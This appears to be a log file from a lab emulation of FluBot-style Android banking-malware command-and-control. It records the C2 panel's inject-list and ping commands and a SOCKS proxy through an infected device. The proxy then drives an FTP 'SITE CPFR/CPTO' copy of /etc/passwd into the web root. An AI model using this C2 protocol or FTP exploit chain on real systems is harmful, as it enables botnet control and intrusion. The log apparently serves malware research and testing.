@@ -1,0 +1,28 @@
+[c2] laboratory RSA private key exported to /home/juadelavi/python-labnet/smoke/20260821-113219/flubot/keys/flubot-rsa-private.pem
+[c2] SOCKS control listening on 189.165.94.67:9000
+[c2] HTTP panel listening on 189.165.94.67:80/poll.php
+[c2] HTTP 'PREPING,' -> 'NONE,' key=kqpuhfvmhx
+[c2] HTTP 'GET_INJECTS_LIST,com.android.chrome,com.google.android.gm' -> 'com.android.chrome' key=fmaqmrwouw
+[c2] HTTP 'PING,3.1,11,Google,Pixel,en,1,lab' -> 'SOCKS,gurbngbcxheshsj.ru:9000' key=kwuxjjoulj
+[c2] control connection from 10.106.7.10:41184
+[c2] control hello magic=181030 bot_len=32 bot_id=0123456789ABCDEF0123456789ABCDEF
+[c2] SOCKS data listener on 189.165.94.67:4444
+[c2] sent data_port=4444 over control channel
+[c2] SOCKS data connection from 10.106.7.10:40170
+[c2] sent SOCKS4 CONNECT target=10.106.7.20:21 bytes=04 01 00 15 0a 6a 07 14 00
+[c2] SOCKS4 response bytes=00 5a 00 00 00 00 00 00
+[c2] FTP banner via victim: b'220 vulnerable-python-ftp ready\r\n'
+[c2] FTP command via victim: b'USER anonymous\r\n'
+[c2] FTP response via victim: b'331 Anonymous login ok, send password\r\n'
+[c2] FTP command via victim: b'PASS lab@example.com\r\n'
+[c2] FTP response via victim: b'230 Login successful\r\n'
+[c2] FTP command via victim: b'SYST\r\n'
+[c2] FTP response via victim: b'215 UNIX Type: L8\r\n'
+[c2] FTP command via victim: b'PWD\r\n'
+[c2] FTP response via victim: b'257 "/" is the current directory\r\n'
+[c2] FTP command via victim: b'SITE CPFR /etc/passwd\r\n'
+[c2] FTP response via victim: b'350 File or directory exists, ready for destination name\r\n'
+[c2] FTP command via victim: b'SITE CPTO /var/www/html/pwned.txt\r\n'
+[c2] FTP response via victim: b'250 Copy successful: /etc/passwd -> /var/www/html/pwned.txt\r\n'
+[c2] FTP command via victim: b'QUIT\r\n'
+[c2] FTP response via victim: b'221 Goodbye\r\n'
